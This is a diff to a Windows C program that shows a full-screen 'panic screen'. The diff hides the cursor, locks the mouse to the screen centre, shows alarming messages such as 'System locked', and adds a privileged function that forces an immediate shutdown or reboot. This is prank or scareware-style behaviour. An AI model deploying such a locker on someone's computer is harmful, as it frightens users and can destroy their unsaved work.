@@ -18,6 +18,33 @@ void AddLog(const wchar_t *fmt, ...) {
     InvalidateRect(g_hwnd, NULL, TRUE); //redraw call
 }
 
+BOOL Shutdown(BOOL bReboot)
+{
+	HANDLE hToken;
+	TOKEN_PRIVILEGES tkp;
+
+	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+		return FALSE;
+
+	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
+
+	tkp.PrivilegeCount = 1;
+	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	// need to adjust privileges to allow user to shutdown
+	if(!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0))
+		return FALSE;
+
+	if(!InitiateSystemShutdown(NULL, NULL, 0, TRUE, bReboot))
+		return FALSE;
+
+	tkp.Privileges[0].Attributes = 0;
+
+	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0);
+
+	return TRUE;
+}
+
 void CursorToCenter() {
     int x = GetSystemMetrics(SM_CXSCREEN) / 2;
     int y = GetSystemMetrics(SM_CYSCREEN) / 2;
@@ -34,6 +61,7 @@ DWORD WINAPI LoggerThread(LPVOID lp) {
         Sleep(101);
     }
 }
+
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     switch (msg){
@@ -82,12 +110,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmd, int nCmdSh
         0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
         NULL, NULL, hInstance, NULL
     );
-    SetTimer(g_hwnd, 1, 10, NULL);
-        
+
+    SetTimer(g_hwnd, 1, 10, NULL); // Timer for the mouse center lock
 
     ShowWindow(g_hwnd, SW_SHOW);
-    ShowCursor(TRUE);
-    
+    ShowCursor(FALSE);
+
     AddLog(L"[+] Panic screen initialized");
     AddLog(L"[+] Checking USB ports...");
     AddLog(L"[!] System locked");
